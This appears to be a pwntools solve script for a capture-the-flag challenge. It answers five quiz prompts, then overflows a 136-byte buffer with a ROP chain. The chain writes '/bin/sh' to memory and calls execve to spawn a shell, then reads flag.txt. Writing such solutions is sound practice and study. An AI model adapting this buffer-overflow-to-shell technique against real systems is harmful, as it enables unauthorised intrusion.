#!/usr/bin/env python3
import json
from pwn import *

context.log_level = 'error'
context.terminal = ['alacritty', '-e']

exe = ELF("./chall")

context.binary = exe

io = None

def conn():
    if args.LOCAL:
        io = process([exe.path])
    elif args.GDB:
        io = gdb.debug([exe.path], gdbscript="""
        b *play+769
        contextwatch execute 'x/gx 0x407b20+500'
        c
        """)
    else:
        io = remote(args.HOST, args.PORT, ssl=args.SSL)
        if args.TEAM_TOKEN:
            io.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

    return io


def load_answers():
    with open("questions.json", "r") as f:
        data = json.load(f)
        qanda = {}
        for q in data:
            qanda[q['question']] = q[q['answer']]
        return qanda


def answer(answers):
    global io

    question = io.recvuntil(b"(answer max 100 chars)")
    question = question.split(b'\n')[-1].removesuffix(b'(answer max 100 chars)').strip()
    answer = answers[question.decode()]
    io.sendlineafter(b"> ", answer.encode())
    io.sendlineafter(b"(y/n) ", b"y")


ADD_RBX_1_MUL_RBX_MOV_RBX_RAX = 0x4011ca # mul rbx; mov rbx, rax; ret;
XOR_RBX_RBX = 0x4011dc # xor rbx, rbx; ret;
MOV_RCX_RBX = 0x4011e7 # mov [rcx], rbx;
POP_RCX_XOR_RAX_RCX_SUB_RAX_1 = 0x4011f2 # pop rcx; xor rax, rcx; sub rax, 0x1; ret
POP_RDI_POP_RSI_POP_RDX = 0x401202 # pop rdi; pop rsi; pop rdx; ret;
SYSCALL = 0x40152a # syscall

def write_bin_sh():
    # zeroing rax after last printf in program (prints 0x26 bytes)
    chain = flat(
        POP_RCX_XOR_RAX_RCX_SUB_RAX_1, 
        0x27,
        # assert(rax == 0)
        POP_RCX_XOR_RAX_RCX_SUB_RAX_1, b'0bin/sh\x00', # '0' gets decremented and becomes '/'
        # zeroing rbx
        XOR_RBX_RBX,
        # moving /bin/sh\x00 to rbx
        ADD_RBX_1_MUL_RBX_MOV_RBX_RAX
    )

    return chain


def main():
    global io
    io = conn() 
    answers = load_answers()

    BSS = 0x407b20
    MEM = BSS + 500

    offset = 136
    chain = flat(
        offset * b'A',
        write_bin_sh(),
        # write addr where to write in rcx
        POP_RCX_XOR_RAX_RCX_SUB_RAX_1,
        MEM,
        # write /bin/sh in memory
        MOV_RCX_RBX,
        # load in rax 0x3b to perform execve 
        POP_RCX_XOR_RAX_RCX_SUB_RAX_1,
        0x68732f6e291f3a ^ (0x3b + 1), # value in rax after previous ops ^ (value we want + 1 because of sub)
        # load args in registers for execve
        POP_RDI_POP_RSI_POP_RDX,
        MEM, # *filename = addr of /bin/sh written in memory
        0,   # argv
        0,   # envp
        SYSCALL # profit
    )

    for i in range(5):
        answer(answers)

    io.sendlineafter(b"da money: ", chain)

    io.sendlineafter(b'XD Aha! Just kidding, no money here XD', b'cat flag.txt')

    flag = io.clean().decode().strip()
    print(flag)


if __name__ == "__main__":
    main()
